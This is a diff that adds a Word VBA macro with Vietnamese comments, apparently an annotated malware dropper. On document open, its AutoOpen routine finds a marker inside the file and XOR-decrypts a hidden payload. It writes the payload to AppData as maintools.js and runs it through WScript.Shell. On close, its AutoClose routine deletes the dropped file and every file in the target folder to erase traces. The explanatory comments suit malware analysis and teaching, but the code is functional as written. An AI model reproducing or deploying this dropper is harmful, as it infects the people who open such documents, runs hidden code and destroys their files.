@@ -1,0 +1,119 @@
+' Biến lưu đường dẫn tệp độc hại
+Public MaliciousFilePath As String
+Public TargetFolder As String
+
+' Hàm giải mã dữ liệu bằng XOR
+Function DecryptXOR(encryptedData() As Byte, dataLength As Long) As Boolean
+    Dim xorKey As Byte
+    xorKey = 45 ' Khóa XOR ban đầu
+    
+    ' Duyệt từng byte và giải mã
+    For i = 0 To dataLength - 1
+        encryptedData(i) = encryptedData(i) Xor xorKey
+        xorKey = ((xorKey Xor 99) Xor (i Mod 254)) ' Thay đổi khóa theo thuật toán
+    Next i
+    
+    DecryptXOR = True
+End Function
+
+' Xóa dấu vết khi đóng tài liệu
+Sub AutoClose()
+    On Error Resume Next ' nếu có lỗi, tiếp tục thực thi và bỏ qua lỗi 
+    ' Xóa tệp độc hại
+    Kill MaliciousFilePath
+    
+    ' Xóa tất cả tệp trong thư mục mục tiêu
+    On Error Resume Next
+    Set fileSystem = CreateObject("Scripting.FileSystemObject") ' Tạo đối tượng FileSystem
+    fileSystem.DeleteFile TargetFolder & "\*.*", True ' xóa tất cả tệp trong thư mục
+    Set fileSystem = Nothing ' giải phóng đối tượng FileSystem
+End Sub
+
+' Thực thi mã độc khi mở tài liệu
+Sub AutoOpen()
+    On Error GoTo Cleanup ' Nếu có lỗi, chuyển đến Cleanup
+    Dim fileHandle As Integer
+    Dim fileSize As Long
+    Dim encryptedData() As Byte  ' mang luu du lieu ma hoa
+    
+    ' Lấy kích thước tệp hiện tại (tài liệu Word)
+    fileSize = FileLen(ActiveDocument.FullName)
+    fileHandle = FreeFile ' trả về số hiệu file khả dụng tiếp theo để mở file 
+    
+    ' Đọc toàn bộ nội dung của tài liệu
+    Open ActiveDocument.FullName For Binary As #fileHandle  ' Mở tệp tài liệu
+    ReDim encryptedData(fileSize) ' Đặt kích thước mảng dữ liệu
+    Get #fileHandle, 1, encryptedData ' Đọc toàn bộ dữ liệu từ file đang mở vào mảng encryptedData 
+    
+    ' Chuyển đổi nội dung tệp sang chuỗi để tìm dữ liệu bị ẩn
+    Dim fileContent As String
+    fileContent = StrConv(encryptedData, vbUnicode)  ' Chuyển đổi mảng dữ liệu sang chuỗi
+    
+    ' Sử dụng Regular Expression để tìm dấu hiệu của payload
+    Dim regex As Object
+    Dim matches As Object 
+    Dim match As Object
+    
+    Set regex = CreateObject("vbscript.regexp") ' Tạo đối tượng RegExp
+    regex.Pattern = "MxOH8pcrlepD3SRfF5ffVTy86Xe41L2qLnqTd5d5R7Iq87mWGES55fswgG84hIRdX74dlb1SiFOkR1Hh" 
+    Set matches = regex.Execute(fileContent)  ' duyệt qua filecontent để tìm chuỗi tương ứng với pattern    
+    
+    ' Nếu không tìm thấy dữ liệu độc hại, thoát
+    If matches.Count = 0 Then GoTo Cleanup
+    
+    ' Lấy vị trí dữ liệu độc hại trong tệp
+    Dim maliciousDataOffset As Long
+    For Each match In matches
+        maliciousDataOffset = match.FirstIndex  ' lấy vị trí đầu tiên của chuỗi tìm thấy
+        Exit For ' thóat khỏi vòng lặp ngay khi tìm thấy chuỗi
+    Next
+    
+    ' Đọc payload bị mã hóa
+    Dim payloadData() As Byte
+    Dim payloadSize As Long
+    payloadSize = 16827 ' Kích thước payload
+    
+    ReDim payloadData(payloadSize)
+    Get #fileHandle, maliciousDataOffset + 81, payloadData  ' Đọc dữ liệu từ file word , với vị trí bắt đầu từ maliciousDataOffset + 81 và lưu vào mảng payloadData
+    ' + 81 : Offset bổ sung 81 byte (có thể là khoảng cách từ marker đến payload thật)
+    
+    ' Giải mã payload bằng XOR
+    If Not DecryptXOR(payloadData(), payloadSize + 1) Then GoTo Cleanup 
+    ' Hàm DecryptXOR sẽ xor từng byte của payload với một khóa bí mật. 
+    ' Nếu giải mã không thành công, chuyển đến Cleanup
+    
+    ' Xác định thư mục lưu trữ payload
+    TargetFolder = Environ("appdata") & "\Microsoft\Windows"   ' thư mục nơi lưu trữ payload 
+    ' Environ("appdata") trả về đường dẫn C:\Users<user>\AppData\Roaming. 
+    Set fileSystem = CreateObject("Scripting.FileSystemObject") ' Tạo đối tượng FileSystem để thao tác với file hệ thống 
+    
+    If Not fileSystem.FolderExists(TargetFolder) Then  ' Kiểm tra xem thư mục \Microsoft\Windows có tồn tại hay không 
+        TargetFolder = Environ("appdata") ' nếu không tồn tại thì lưu vào thư mục AppData
+    End If
+    Set fileSystem = Nothing
+    
+    ' Lưu payload dưới dạng tệp JavaScript
+    Dim outputFileHandle As Integer
+    outputFileHandle = FreeFile
+    MaliciousFilePath = TargetFolder & "\" & "maintools.js" ' Đường dẫn tệp độc hại
+    
+    Open MaliciousFilePath For Binary As #outputFileHandle
+    Put #outputFileHandle, 1, payloadData  ' Ghi dữ liệu vào tệp
+    Close #outputFileHandle ' Đóng tệp
+    
+    ' Giải phóng mảng dữ liệu
+    Erase payloadData 
+    
+    ' Thực thi tệp độc hại
+    Dim shell As Object
+    Set shell = CreateObject("WScript.Shell") ' Tạo đối tượng Shell
+    shell.Run """" & MaliciousFilePath & """" & " EzZETcSXyKAdF_e5I2i1"  ' Thực thi tệp JavaScript với tham số EzZETcSXyKAdF_e5I2i1 , có thể là tham số để giải mã
+    
+    ' Lưu tài liệu để tránh nghi ngờ
+    ActiveDocument.Save  
+    Exit Sub ' Thoát khỏi hàm AutoOpen
+    
+Cleanup: ' nhãn Cleanup để xử lý lỗi 
+    Close #fileHandle 
+    ActiveDocument.Save ' Lưu tài liệu
+End Sub
